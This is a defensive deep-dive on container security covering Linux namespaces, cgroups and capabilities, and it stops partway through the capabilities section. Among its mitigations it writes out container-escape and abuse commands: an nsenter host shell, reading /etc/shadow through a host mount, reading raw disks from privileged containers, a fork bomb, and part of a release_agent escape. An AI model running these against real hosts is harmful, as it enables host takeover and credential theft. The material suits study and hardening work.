# Docker & containerd Security: A Complete, Production-Grade Deep-Dive
## Linux, Cloud, and Cloud-Native Environments

> **Audience**: Senior security/systems engineers. This document assumes kernel internals literacy.  
> **Scope**: From syscall boundary to multi-cloud deployment. Vulnerable + secure code in C, Go, Rust.  
> **Lines**: 6000+ of technical exposition, code, and operational guidance.  
> **Last updated reference baseline**: Linux 6.8, containerd 1.7.x, Docker 26.x, runc 1.1.x, Kubernetes 1.30

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Container Fundamentals: Linux Kernel Internals](#2-container-fundamentals-linux-kernel-internals)
3. [Linux Namespaces: Deep Dive](#3-linux-namespaces-deep-dive)
4. [Control Groups (cgroups v1 & v2)](#4-control-groups-cgroups-v1--v2)
5. [Linux Capabilities: Privilege Decomposition](#5-linux-capabilities-privilege-decomposition)
6. [Seccomp: Syscall Filtering](#6-seccomp-syscall-filtering)
7. [Linux Security Modules: AppArmor & SELinux](#7-linux-security-modules-apparmor--selinux)
8. [Docker Architecture & Security Model](#8-docker-architecture--security-model)
9. [containerd Architecture & Security Model](#9-containerd-architecture--security-model)
10. [OCI Specification & runc Internals](#10-oci-specification--runc-internals)
11. [Real-World Container Escape CVEs](#11-real-world-container-escape-cves)
12. [Vulnerable vs Secure Code: C Implementations](#12-vulnerable-vs-secure-code-c-implementations)
13. [Vulnerable vs Secure Code: Go Implementations](#13-vulnerable-vs-secure-code-go-implementations)
14. [Vulnerable vs Secure Code: Rust Implementations](#14-vulnerable-vs-secure-code-rust-implementations)
15. [Container Network Security](#15-container-network-security)
16. [Image Security & Supply Chain](#16-image-security--supply-chain)
17. [Kubernetes & Cloud-Native Security](#17-kubernetes--cloud-native-security)
18. [eBPF for Container Security](#18-ebpf-for-container-security)
19. [Runtime Security: Falco, Tetragon, Tracee](#19-runtime-security-falco-tetragon-tracee)
20. [Threat Model & Attack Surface](#20-threat-model--attack-surface)
21. [Production Hardening Playbook](#21-production-hardening-playbook)
22. [Testing, Fuzzing & Benchmarking](#22-testing-fuzzing--benchmarking)
23. [Cloud-Specific Security (AWS, GCP, Azure)](#23-cloud-specific-security-aws-gcp-azure)
24. [Roll-out & Rollback Plans](#24-roll-out--rollback-plans)
25. [Next 3 Steps & References](#25-next-3-steps--references)

---

## 1. Executive Summary

Containers are **not** a security boundary — they are a resource isolation mechanism built atop a shared Linux kernel. Every container escape, privilege escalation, or lateral movement attack in the last decade has exploited one or more of: kernel vulnerabilities in the syscall surface shared between host and container; misconfigurations of the privilege model (capabilities, namespaces, seccomp); insecure daemon attack surfaces (Docker socket exposure, containerd API); supply chain compromises in base images; and network policy gaps in multi-tenant clusters.

The security engineer's job is to **layer independent controls** such that the failure of any single mechanism does not result in full host compromise. This guide covers every layer: from how `clone(2)` and `unshare(2)` work in the kernel, through runc's container setup code, up to Kubernetes admission webhooks and eBPF-based runtime enforcement.

**Key security principles applied throughout:**
- **Least privilege**: capabilities, seccomp, user namespaces, read-only rootfs
- **Isolation**: namespace depth, cgroup resource limits, separate network policies
- **Defense in depth**: every layer independent — LSM, seccomp, capabilities, user NS
- **Immutability**: container images as build artifacts, not mutable runtime state
- **Observability**: every security event auditable via eBPF/audit framework

**Architecture Overview (ASCII):**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           USER SPACE (Container)                            │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │  Application Process  (uid=1000, capabilities=none)                 │    │
│  │  └─ seccomp BPF filter (syscall allowlist)                         │    │
│  │  └─ AppArmor/SELinux profile (file/net/ipc access control)         │    │
│  └──────────────────┬──────────────────────────────────────────────────┘    │
│  ┌─────────────────┼────────────────────────────────────────────────────┐   │
│  │  Namespaces     │  pid, mnt, net, uts, ipc, user, cgroup, time      │   │
│  │  cgroups v2     │  cpu, memory, pids, io, rdma limits               │   │
│  └─────────────────┼────────────────────────────────────────────────────┘   │
└────────────────────┼────────────────────────────────────────────────────────┘
                     │ syscall interface (restricted surface)
┌────────────────────▼────────────────────────────────────────────────────────┐
│                        LINUX KERNEL                                         │
│  ┌──────────┐ ┌──────────┐ ┌───────────┐ ┌────────────┐ ┌──────────────┐  │
│  │ VFS/ext4 │ │ netfilter│ │ LSM hooks │ │  audit log │ │  eBPF probes │  │
│  └──────────┘ └──────────┘ └───────────┘ └────────────┘ └──────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
                     │ hardware
┌────────────────────▼────────────────────────────────────────────────────────┐
│  Hardware:  IOMMU / Intel TXT / AMD SEV / ARM TrustZone / TPM              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Container Fundamentals: Linux Kernel Internals

### 2.1 What a Container Actually Is

A container is **a process (or process tree) with a restricted view of the kernel's namespaces, controlled resource access via cgroups, reduced capability set, and filtered syscall surface via seccomp**. There is no hypervisor boundary. The container kernel IS the host kernel.

This is the fundamental security distinction between:
- **Containers**: shared kernel, namespace isolation, cgroup limits
- **VMs**: separate kernel per guest, hardware-enforced isolation (VMX/SVM)
- **MicroVMs** (Firecracker, gVisor): VM-like isolation but container-like footprint

When you run `docker run ubuntu bash`, the Docker daemon calls `containerd`, which calls `runc`, which calls `clone(2)` with namespace flags, sets up the rootfs via `pivot_root(2)`, drops capabilities, applies seccomp, and then `execve(2)` the entrypoint.

### 2.2 The Critical Syscalls

Understanding these syscalls is foundational. All container runtimes use them:

```c
/* Namespace creation - the foundation of containers */
int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ...);

/* Namespace-specific flags used by container runtimes */
#define CLONE_NEWNS    0x00020000  /* New mount namespace */
#define CLONE_NEWUTS   0x04000000  /* New UTS (hostname) namespace */
#define CLONE_NEWIPC   0x08000000  /* New IPC namespace */
#define CLONE_NEWUSER  0x10000000  /* New user namespace */
#define CLONE_NEWPID   0x20000000  /* New PID namespace */
#define CLONE_NEWNET   0x40000000  /* New network namespace */
#define CLONE_NEWCGROUP 0x02000000 /* New cgroup namespace (since 4.6) */
#define CLONE_NEWTIME  0x00000080  /* New time namespace (since 5.6) */

/* Disassociate from namespace - used for rootless containers */
int unshare(int flags);

/* Change root filesystem - key isolation mechanism */
int pivot_root(const char *new_root, const char *put_old);

/* Deprecated alternative (security issues) */
int chroot(const char *path);  /* DO NOT USE - escapable */

/* Capability manipulation */
int capset(cap_user_header_t header, const cap_user_data_t data);
int capget(cap_user_header_t header, cap_user_data_t data);
int prctl(int option, unsigned long arg2, ...);

/* Seccomp */
int seccomp(unsigned int operation, unsigned int flags, void *args);
int prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

/* Mount operations for container rootfs setup */
int mount(const char *source, const char *target,
          const char *filesystemtype, unsigned long mountflags,
          const void *data);
int umount2(const char *target, int flags);
```

### 2.3 Process Lifecycle in a Container

When `runc create` is invoked, the following sequence occurs in the kernel:

```
runc (parent process)
  │
  ├─── clone(CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNS|CLONE_NEWNET|
  │          CLONE_NEWUTS|CLONE_NEWIPC|CLONE_NEWCGROUP)
  │         │
  │         └─── [kernel] Creates new namespaces, inherits parent NS if flag absent
  │
  ├─── [child process - "runc init"]
  │         │
  │         ├── Setup uid/gid mappings (write /proc/PID/uid_map)
  │         ├── pivot_root() to container rootfs
  │         ├── mount /proc, /sys, /dev inside new NS
  │         ├── Drop capabilities (capset to reduced set)
  │         ├── Apply seccomp filter (prctl/seccomp syscall)
  │         ├── Set hostname (sethostname in UTS namespace)
  │         └── execve("/bin/sh", ...)  ← actual container entrypoint
  │
  └─── runc parent monitors child, sets up cgroup membership
```

### 2.4 Kernel Data Structures Involved

The kernel maintains several key data structures per process:

```c
/* Simplified from linux/sched.h - task_struct relevant security fields */
struct task_struct {
    /* Namespace references */
    struct nsproxy *nsproxy;        /* Points to all namespaces */

    /* Credential and capability information */
    const struct cred *real_cred;   /* Objective UID/GID/caps */
    const struct cred *cred;        /* Effective UID/GID/caps */

    /* Security module data */
    void *security;                 /* LSM-specific data (SELinux label etc) */

    /* Seccomp */
    struct seccomp seccomp;         /* Per-thread seccomp state */

    /* Memory management */
    struct mm_struct *mm;

    /* ... many more fields */
};

/* nsproxy - the container's namespace bundle */
struct nsproxy {
    atomic_t count;
    struct uts_namespace *uts_ns;       /* hostname, domainname */
    struct ipc_namespace *ipc_ns;       /* SysV IPC, POSIX MQ */
    struct mnt_namespace *mnt_ns;       /* mount points */
    struct pid_namespace *pid_ns_for_children;
    struct net *net_ns;                 /* network stack */
    struct time_namespace *time_ns;
    struct cgroup_namespace *cgroup_ns;
};

/* cred - credentials (capabilities live here) */
struct cred {
    kuid_t uid, euid, suid, fsuid;      /* user IDs */
    kgid_t gid, egid, sgid, fsgid;      /* group IDs */
    kernel_cap_t cap_inheritable;        /* caps new process can inherit */
    kernel_cap_t cap_permitted;          /* max caps process can have */
    kernel_cap_t cap_effective;          /* active caps */
    kernel_cap_t cap_bset;               /* bounding set (ceiling) */
    kernel_cap_t cap_ambient;            /* ambient (since 4.3) */
    struct user_namespace *user_ns;
    void *security;                      /* LSM blob */
};
```

### 2.5 Why chroot Is Insufficient (and pivot_root Is Required)

`chroot(2)` changes the root directory for file lookups but does **not** prevent escape:
- A process with `CAP_SYS_CHROOT` can call `chroot(".")` repeatedly to escape
- A process can `open(".")` before chroot then `fchdir()` after to escape to real root
- No mount namespace isolation — process still sees `/proc` of host

`pivot_root(2)` with a proper mount namespace is correct:

```c
/* Correct container rootfs setup (simplified runc approach) */
int setup_rootfs(const char *new_root) {
    char put_old[PATH_MAX];
    snprintf(put_old, sizeof(put_old), "%s/.pivot_root", new_root);

    /* Bind mount new_root onto itself to make it a mount point */
    if (mount(new_root, new_root, NULL, MS_BIND | MS_REC, NULL) < 0)
        return -1;

    /* Create directory for old root */
    mkdir(put_old, 0700);

    /* Pivot: new_root becomes /, old / goes to put_old */
    if (syscall(SYS_pivot_root, new_root, put_old) < 0)
        return -1;

    /* Change to new root */
    chdir("/");

    /* Unmount old root - this is the critical step */
    /* MS_DETACH = lazy unmount, removes from mount table immediately */
    if (umount2("/.pivot_root", MNT_DETACH) < 0)
        return -1;

    rmdir("/.pivot_root");
    return 0;
}
```

### 2.6 The Shared Kernel Problem

This is the fundamental threat model difference vs VMs:

```
VM Security Model:
  Guest App → Guest OS Kernel → Hypervisor → Host OS → Hardware
  [attack must cross hypervisor boundary - VMX/SVM hardware enforcement]

Container Security Model:
  Container App → Host OS Kernel → Hardware
  [no hardware boundary - only software isolation]
```

**Real consequence**: A kernel vulnerability (e.g., dirty pipe CVE-2022-0847, dirty cow CVE-2016-5195) exploitable from within a container with default settings can give full host root. This has happened repeatedly. The only mitigations are:
1. Keep the kernel patched
2. Reduce the exploitable syscall surface via seccomp
3. Use user namespaces (some attacks require specific capabilities)
4. Use VM-based container runtimes (gVisor, Firecracker) for high-risk workloads

---

## 3. Linux Namespaces: Deep Dive

### 3.1 Namespace Types and Kernel Versions

| Namespace | Flag | Kernel | Isolates | Security Impact |
|-----------|------|--------|----------|-----------------|
| Mount | CLONE_NEWNS | 2.4.19 | Filesystem view | Prevents host fs access |
| UTS | CLONE_NEWUTS | 2.6.19 | Hostname, domainname | Low (cosmetic) |
| IPC | CLONE_NEWIPC | 2.6.19 | SysV IPC, POSIX MQ | Prevents IPC hijack |
| PID | CLONE_NEWPID | 2.6.24 | Process ID space | Prevents ptrace across NS |
| Network | CLONE_NEWNET | 2.6.24 | Network stack | Critical for net isolation |
| User | CLONE_NEWUSER | 3.8 | UID/GID mapping | Enables rootless containers |
| Cgroup | CLONE_NEWCGROUP | 4.6 | cgroup filesystem view | Prevents cgroup escape |
| Time | CLONE_NEWTIME | 5.6 | Clock offsets | Mainly for migration |

### 3.2 PID Namespace: Deep Security Analysis

**What PID namespaces do:**
- Processes in a new PID namespace get PID 1 (the "init" of that namespace)
- PID 1 in a namespace receives signals from the host differently
- Host can see all PIDs via `/proc` (if bind-mounted); container cannot see host PIDs

**Security implication: PID 1 behavior**:

```c
/*
 * VULNERABLE: Container init that doesn't properly handle signals
 * Real-world issue: zombie process accumulation, improper SIGTERM handling
 * leading to abrupt SIGKILL on docker stop
 */
int main(void) {
    /* BAD: Starting a shell directly as PID 1 */
    /* Shell doesn't reap zombies - init responsibility */
    execve("/bin/sh", (char*[]){"/bin/sh", NULL}, environ);
    /* If sh forks children and they die, they become zombies */
    /* /bin/sh as PID 1 doesn't handle SIGTERM correctly always */
}

/*
 * SECURE: Minimal tini-style init for containers
 * Used by Docker's --init flag, which uses tini
 */
#include 
#include <sys/wait.h>
#include 
#include 
#include 
#include 

static int child_exit_status = 0;
static pid_t child_pid = -1;

static void signal_handler(int signum) {
    if (child_pid > 0) {
        kill(child_pid, signum);  /* Forward signal to child */
    }
}

static void setup_signals(void) {
    struct sigaction sa = {0};
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);

    /* Forward most signals to child */
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGHUP, &sa, NULL);

    /* SIGCHLD: reap zombies */
    sa.sa_handler = SIG_DFL;
    sa.sa_flags = SA_NOCLDWAIT;  /* Auto-reap zombies */
    sigaction(SIGCHLD, &sa, NULL);
}

int container_init(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: init  [args...]\n");
        return 1;
    }

    setup_signals();

    child_pid = fork();
    if (child_pid == 0) {
        /* Child: exec the actual application */
        execvp(argv[1], &argv[1]);
        perror("execvp");
        exit(127);
    }

    /* Parent (PID 1): wait loop - reap ALL zombies */
    int status;
    pid_t pid;
    while (1) {
        pid = waitpid(-1, &status, 0);
        if (pid == child_pid) {
            /* Main child exited */
            if (WIFEXITED(status))
                child_exit_status = WEXITSTATUS(status);
            else if (WIFSIGNALED(status))
                child_exit_status = 128 + WTERMSIG(status);
            break;
        }
        /* Other zombie - just reap, don't exit */
        if (pid < 0 && errno == ECHILD)
            break;
    }

    /* Kill remaining children in PID namespace */
    kill(-1, SIGTERM);
    sleep(1);
    kill(-1, SIGKILL);

    return child_exit_status;
}
```

**PID namespace escape: the /proc attack vector:**

```
# VULNERABLE: Container with host /proc mounted
# If the container mounts /proc without new PID namespace:
docker run --pid=host ubuntu cat /proc/1/environ
# Exposes host init process environment (may contain secrets!)
docker run --pid=host ubuntu nsenter -t 1 -m -u -i -n -p sh
# Full host shell! pid=host is equivalent to no PID isolation.

# SECURE: Never use --pid=host unless absolutely required
# Verify correct PID namespace isolation:
ls -la /proc/self/ns/pid
# Should show different inode than host's /proc/1/ns/pid
```

### 3.3 Network Namespace: Deep Security Analysis

Network namespaces create completely separate network stacks:

```
Host Network Stack:
  eth0: 10.0.0.1/24
  lo: 127.0.0.1/8
  iptables rules: host-level
  listening sockets: sshd:22, dockerd:2376

Container Network Stack (veth pair):
  eth0: 172.17.0.2/16  (veth pair endpoint in container NS)
  lo: 127.0.0.1/8
  iptables rules: container-level (separate)
  listening sockets: app:8080 (only visible from container NS)
```

**Network namespace attack vectors:**

```
1. Host network mode (--network=host):
   - Container shares host network stack
   - Container can bind to ANY port on host
   - Container can sniff host network traffic
   - Container can modify host iptables

2. Container network mode (--network=container:VICTIM):
   - Container shares another container's network namespace
   - Can access all ports of the target container
   - Used legitimately for sidecar patterns

3. DNS poisoning within network namespace:
   - Container controls its /etc/resolv.conf
   - Can point to malicious DNS if not properly managed

4. ARP spoofing in bridge network:
   - Docker's default bridge (docker0) allows ARP spoofing
   - Container A can spoof Container B's MAC in bridge mode
   - Mitigation: macvlan with port isolation, or CNI plugins with ARP filtering
```

**Secure network namespace configuration:**

```bash
# Inspect network namespaces
ip netns list
ip netns exec  ip addr show
ip netns exec  ss -tlnp

# Check which network namespace a container is using
docker inspect  | jq '.[0].NetworkSettings.SandboxKey'
# SandboxKey: /var/run/docker/netns/

# Verify host network isolation:
# Container should NOT see host's listening sockets
docker run --rm alpine ss -tlnp
# vs host: ss -tlnp - different results = correct isolation

# Enable sysctl hardening in network namespace:
docker run --sysctl net.ipv4.conf.all.rp_filter=1 \
           --sysctl net.ipv4.conf.all.accept_redirects=0 \
           --sysctl net.ipv4.conf.all.send_redirects=0 \
           --sysctl net.ipv4.conf.all.accept_source_route=0 \
           --sysctl net.ipv6.conf.all.accept_ra=0 \
           ubuntu
```

### 3.4 User Namespaces: The Rootless Revolution

User namespaces are the most important security feature for containers. They allow mapping of UIDs/GIDs between host and container:

```
Container UID 0 (root) → Host UID 100000 (unprivileged user)
Container UID 1000      → Host UID 101000
...
```

**Kernel uid_map mechanism:**

```c
/*
 * /proc/PID/uid_map format:
 *   
 *
 * Example for rootless container:
 * 0 100000 65536
 * Means: container UIDs 0-65535 → host UIDs 100000-165535
 */

/* Writing uid_map to set up user namespace */
int setup_user_namespace(pid_t child_pid, uid_t host_uid, gid_t host_gid) {
    char path[256];
    char mapping[64];
    int fd;

    /* Must write "deny" to setgroups before writing gid_map */
    snprintf(path, sizeof(path), "/proc/%d/setgroups", child_pid);
    fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    write(fd, "deny", 4);
    close(fd);

    /* Write UID mapping: container root → host unprivileged user */
    snprintf(path, sizeof(path), "/proc/%d/uid_map", child_pid);
    fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    snprintf(mapping, sizeof(mapping), "0 %d 65536\n", host_uid);
    write(fd, mapping, strlen(mapping));
    close(fd);

    /* Write GID mapping */
    snprintf(path, sizeof(path), "/proc/%d/gid_map", child_pid);
    fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    snprintf(mapping, sizeof(mapping), "0 %d 65536\n", host_gid);
    write(fd, mapping, strlen(mapping));
    close(fd);

    return 0;
}
```

**User namespace security properties:**

```bash
# rootless Docker/Podman: container root is NOT host root
# Verify: check if container root can access host files owned by root
docker run --userns=host ubuntu id    # uid=0(root) - DANGEROUS: real root
# vs:
docker run ubuntu id                  # uid=0(root) - in user NS, not real root

# On host, files created by rootless container appear as:
# /var/lib/docker/... owned by subuid range (e.g., 100000)
ls -la /proc/$(docker inspect --format '{{.State.Pid}}' CONTAINER)/root
# Owner: 100000, not 0

# Check current user namespace depth
cat /proc/self/uid_map
# 0 1000 1  (if running as uid 1000 on host, mapped to 0 in this NS)

# Maximum user namespace nesting depth (kernel limit):
cat /proc/sys/user/max_user_namespaces
# Default: 14585 (kernel enforced limit)

# /proc/sys/user/* - per-namespace resource limits
cat /proc/sys/user/max_pid_namespaces
cat /proc/sys/user/max_net_namespaces
cat /proc/sys/user/max_ipc_namespaces
```

**User namespace attack: privilege escalation via capability inheritance:**

```c
/*
 * VULNERABILITY PATTERN: Capability leak across user namespaces
 *
 * In a user namespace, a process gets ALL capabilities within that namespace.
 * BUT those capabilities are restricted to objects owned by that namespace.
 *
 * EXCEPT: files on the filesystem owned by real root (uid 0 on host)
 * appear as owned by 'nobody' (overflow UID, typically 65534) inside the
 * user namespace. Accessing these requires specific handling.
 *
 * REAL CVE: CVE-2018-18955 - user namespace uid mapping bypass
 * Allowed bypassing filesystem permission checks via UID remapping flaw.
 *
 * The attack: a process in user namespace with CAP_DAC_READ_SEARCH could
 * read files on the host that belonged to nobody (uid 65534 overflow) but
 * appeared accessible due to mapping confusion.
 */

/* VULNERABLE: Checking privileges without verifying namespace */
int check_privileged_access(struct file *file, int mask) {
    /* BAD: checking current capability without namespace context */
    if (capable(CAP_DAC_OVERRIDE)) {
        return 0;  /* Allowed - but is this in the right namespace? */
    }
    return -EACCES;
}

/* SECURE: Kernel's correct approach - namespace-aware capability check */
int check_privileged_access_safe(struct file *file, int mask) {
    struct inode *inode = file_inode(file);

    /*
     * ns_capable checks if the process has the capability IN THE NAMESPACE
     * that owns the resource, not just any namespace.
     */
    if (ns_capable(file->f_cred->user_ns, CAP_DAC_OVERRIDE)) {
        return 0;
    }

    /*
     * uid_eq with i_uid_into_mnt accounts for UID namespace mapping
     * This ensures we compare against the correct host UID
     */
    kuid_t i_uid = i_uid_into_mnt(file->f_path.mnt, inode);
    if (uid_eq(current_fsuid(), i_uid)) {
        return 0;
    }

    return -EACCES;
}
```

### 3.5 Mount Namespace: Filesystem Isolation

Mount namespaces ensure each container has its own view of the filesystem:

```bash
# Container rootfs structure (OCI bundle layout)
/
├── bin, lib, usr, etc        # container OS files
├── proc                      # new procfs (MS_NOSUID|MS_NODEV|MS_NOEXEC)
├── sys                       # sysfs (read-only or masked)
├── dev                       # devtmpfs (restricted devices)
│   ├── null, zero, random    # safe devices
│   ├── urandom               # safe
│   └── tty, pts/*            # if --tty
├── tmp                       # tmpfs
└──                # actual application

# DANGEROUS mount propagation - shared mounts can propagate to host!
# MS_SHARED: mounts propagate to/from peers
# MS_SLAVE: receives from master, doesn't propagate back
# MS_PRIVATE: no propagation at all (default for container mounts)
# MS_UNBINDABLE: cannot be bind-mounted

# runc ensures all mounts inside container use MS_PRIVATE propagation
# to prevent mount events leaking to host namespace

# Verify mount propagation:
cat /proc/self/mountinfo | grep -E "shared|slave|private"
# Containers should show "private" for all mounts

# Dangerous: --volume /:/host exposes entire host filesystem
docker run -v /:/host ubuntu ls /host/etc/shadow
# Can read host shadow file!

# Check for dangerous volume mounts:
docker inspect  | jq '.[0].HostConfig.Binds'
docker inspect  | jq '.[0].Mounts[] | select(.Source | startswith("/"))'
```

**Masked paths (runc default security):**

```
# runc masks these paths by default (bind-mounts /dev/null over them):
/proc/asound
/proc/acpi
/proc/kcore           # Direct kernel memory access!
/proc/keys
/proc/latency_stats
/proc/timer_list
/proc/timer_stats
/proc/sched_debug     # Kernel scheduler debug info
/proc/scsi
/sys/firmware         # Firmware interface
/sys/devices/virtual/powercap  # Power management

# Read-only paths (mounted read-only):
/proc/bus
/proc/fs
/proc/irq
/proc/sys
/proc/sysrq-trigger
```

### 3.6 IPC Namespace

IPC namespaces isolate:
- System V message queues, semaphores, shared memory
- POSIX message queues

```bash
# VULNERABILITY: Shared IPC namespace between containers
docker run -d --name victim --ipc=shareable my-service
docker run --ipc=container:victim attacker-image

# Attacker can now:
# 1. Read/write shared memory segments of victim
# 2. Signal semaphores (cause denial of service)
# 3. Read message queues (information disclosure)

# Inside container with shared IPC:
ipcs -a      # List all IPC objects from victim container

# SECURE: Use private IPC namespace (default) or shareable only when needed
docker run --ipc=private my-service  # Each container isolated

# Check IPC namespace:
ls -la /proc/self/ns/ipc
# Should be unique per container
```

### 3.7 Cgroup Namespace

Cgroup namespaces (kernel 4.6+) virtualize the cgroup hierarchy view:

```bash
# Without cgroup namespace: container sees host cgroup hierarchy
# /sys/fs/cgroup shows entire host hierarchy including other containers

# With cgroup namespace: container root appears as /sys/fs/cgroup
# Container cannot see other containers' cgroups

# Verify: inside container
cat /proc/self/cgroup
# Should show /  not /system.slice/docker-.scope

# Security implication: without cgroup namespace,
# a container with mount capabilities could remount cgroup
# filesystem and see/manipulate other containers' limits!
```

---

## 4. Control Groups (cgroups v1 & v2)

### 4.1 cgroups v1 Architecture and Security Issues

cgroups v1 organizes resources into separate hierarchies, each independently mountable:

```
cgroups v1 hierarchy (problematic design):
/sys/fs/cgroup/
├── cpu/                    # CPU scheduling
│   └── docker/
│       └── <container-id>/
├── memory/                 # Memory limits
│   └── docker/
│       └── <container-id>/
├── blkio/                  # Block I/O
├── net_cls/                # Network class tagging
├── net_prio/               # Network priority
├── pids/                   # PID count limit
├── devices/                # Device access control (CRITICAL)
├── cpuset/                 # CPU/memory node pinning
└── freezer/                # Suspend/resume processes

# SECURITY ISSUE WITH V1: Multiple hierarchies = complex interactions
# A process can be in different cgroups in different hierarchies
# This has led to escape bugs (see CVE-2022-0492)
```

**CVE-2022-0492: cgroups v1 release_agent escape:**

```bash
# This was a container escape via cgroups v1 release_agent
# Requires: CAP_DAC_OVERRIDE or CAP_SYS_ADMIN OR
#           unshared user namespace (for writing to cgroup files)

# Attack concept (EDUCATIONAL - DO NOT USE MALICIOUSLY):
# 1. Create a new cgroup hierarchy mount inside container
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. Create child cgroup
mkdir /tmp/cgrp/child

# 3. Enable release_agent (notified when cgroup becomes empty)
echo 1 > /tmp/cgrp/child/notify_on_release

# 4. Write a script path to release_agent
# This script runs with ROOT privileges on the HOST!
echo "#!/bin/sh\ncat /etc/shadow > /tmp/pwned" > /evil.sh
chmod +x /evil.sh
# release_agent is written to PARENT cgroup (host cgroup filesystem)
# This is the escape: the path traversal to the host cgroup

# Mitigation: use cgroups v2, which doesn't have release_agent
# OR use seccomp to block cgroup mount
# OR use AppArmor/SELinux to prevent writing to release_agent files
```

### 4.2 cgroups v2: Unified Hierarchy

cgroups v2 (kernel 4.5+, fully usable from ~5.2) addresses v1's design problems:

```
cgroups v2 unified hierarchy:
/sys/fs/cgroup/
├── cgroup.controllers      # Available controllers
├── cgroup.procs            # Process list
├── cgroup.subtree_control  # Active controllers for children
├── cpu.max                 # CPU quota (replaces cpu/cfs_quota_us)
├── cpu.weight              # CPU weight (replaces cpu/shares)
├── memory.max              # Memory hard limit
├── memory.high             # Memory throttle threshold
├── memory.low              # Memory protect threshold
├── io.max                  # IO bandwidth limit
├── pids.max                # Maximum number of PIDs
└── docker/
    └── <container-id>/
        ├── cgroup.procs
        ├── memory.current
        ├── cpu.stat
        └── ...
```

**Key v2 security improvements:**
- Single hierarchy: no inconsistency between hierarchies
- No `release_agent` (CVE-2022-0492 mitigation)
- Delegation model: unprivileged processes can manage subtrees
- Better containment of resource abuse

**cgroup v2 configuration for security:**

```bash
# Check if system uses cgroups v2:
stat -f /sys/fs/cgroup | grep Type
# 0x63677270 = cgroup v2 (tmpfs-like filesystem)
# Or:
mount | grep cgroup2

# Docker cgroup v2 configuration in /etc/docker/daemon.json:
{
  "cgroupdriver": "systemd",  # Use systemd as cgroup manager
  "default-runtime": "runc",
  "features": { "buildkit": true }
}

# Container resource limits (production baseline):
docker run \
  --memory=256m \           # Hard memory limit
  --memory-reservation=128m \  # Soft limit (will shrink under pressure)
  --memory-swap=256m \      # = memory limit (no swap - prevents OOM escape)
  --memory-swappiness=0 \   # Disable swapping for this container
  --cpus=0.5 \              # 50% of one CPU
  --cpu-shares=512 \        # Relative weight (default 1024)
  --pids-limit=100 \        # Max 100 processes (fork bomb prevention!)
  --blkio-weight=500 \      # Block I/O weight
  --ulimit nofile=1024:1024 \  # File descriptor limits
  --ulimit nproc=100:100 \     # Process limits (redundant with pids-limit)
  my-container
```

**pids limit: The fork bomb mitigation:**

```c
/*
 * Without --pids-limit, a container can fork until OOM or system panic
 * This is a DoS attack against the host.
 *
 * VULNERABLE: No pids limit
 * docker run ubuntu /bin/sh -c ":(){ :|:& };:"  # fork bomb!
 * This will consume all host PIDs and cause OOM/panic
 *
 * SECURE: pids cgroup controller prevents this
 */

/* Kernel enforcement in kernel/fork.c: */
static int copy_process(/* ... */) {
    struct task_struct *p;

    /* ... */

    /* cgroup pids limit check - called before process creation */
    retval = cgroup_can_fork(p, args);
    if (retval)
        goto bad_fork_cgroup;

    /* If container's pids.max is exceeded, returns -EAGAIN */
    /* Process creation fails safely */
}

/*
 * In production, set pids-limit based on application requirements.
 * Web server: 50-200 (depends on worker model)
 * Database: 50-100
 * Batch jobs: 10-50
 * Sidecar/monitoring: 5-20
 */
```

### 4.3 Memory cgroup Security Implications

```c
/*
 * Memory limits and OOM killer behavior in containers:
 *
 * When a container exceeds memory.max:
 * 1. cgroup OOM killer fires
 * 2. Selects process to kill WITHIN the cgroup
 * 3. Host OOM killer is NOT involved (this is correct isolation)
 *
 * VULNERABILITY: Memory limit bypass via mlock()
 * A process can lock memory pages (mlock/mlockall) before limit enforcement
 * This can cause the container to use more memory than its limit
 * Mitigation: set RLIMIT_MEMLOCK to 0 for container processes
 */

/* Container runtime should set this: */
struct rlimit rl = {.rlim_cur = 0, .rlim_max = 0};
setrlimit(RLIMIT_MEMLOCK, &rl);

/*
 * VULNERABILITY: Huge page memory bypass
 * Some cgroup configurations don't account for huge pages
 * A container can allocate huge pages to bypass memory.max
 * Mitigation: also set hugetlb.X.max in cgroups v2
 */

/* Memory accounting attack: pagecache sharing */
/*
 * Containers sharing the same image layers share page cache.
 * This means:
 * - Container A fills pagecache with data
 * - Container B reads same files - uses Container A's pagecache
 * - Memory accounting may attribute pages to both or neither
 * - This can be used to bypass per-container memory limits
 * Mitigation: memory.use_hierarchy=1, don't share sensitive data via layers
 */
```

### 4.4 Devices cgroup: Hardware Access Control

The devices cgroup controller is critical for preventing container access to host hardware:

```bash
# cgroups v1: devices.allow / devices.deny
# Format: type major:minor access
# type: c(har), b(lock), a(ll)
# access: r(ead), w(rite), m(knod)

# Check container's device permissions:
cat /sys/fs/cgroup/devices/docker//devices.list

# Default Docker device list (secure baseline):
# c 1:3 rwm    # /dev/null
# c 1:5 rwm    # /dev/zero
# c 1:7 rwm    # /dev/full
# c 5:0 rwm    # /dev/tty
# c 1:8 rwm    # /dev/random
# c 1:9 rwm    # /dev/urandom
# c 136:* rwm  # /dev/pts/* (pseudoterminals)
# c 5:2 rwm    # /dev/ptmx
# c 10:200 rwm # /dev/net/tun

# DANGEROUS: a b *:* rwm = ALL block devices readable/writable
# This gives container access to host disks!

# VULNERABLE: --privileged mode sets "a *:* rwm" (all devices)
docker run --privileged ubuntu cat /dev/sda  # Read host disk!

# Secure: explicitly enumerate needed devices only
docker run --device=/dev/dri/renderD128:rwm my-gpu-app  # Only GPU
```

---

## 5. Linux Capabilities: Privilege Decomposition

### 5.1 Capabilities Overview

Linux capabilities break root's monolithic privilege into ~41 distinct capabilities (as of kernel 6.x):

```c
/* From linux/capability.h - security-critical capabilities */

/* Most dangerous - can bypass almost all security controls */
#define CAP_SYS_ADMIN    21  /* Broad administrative ops - "the new root" */
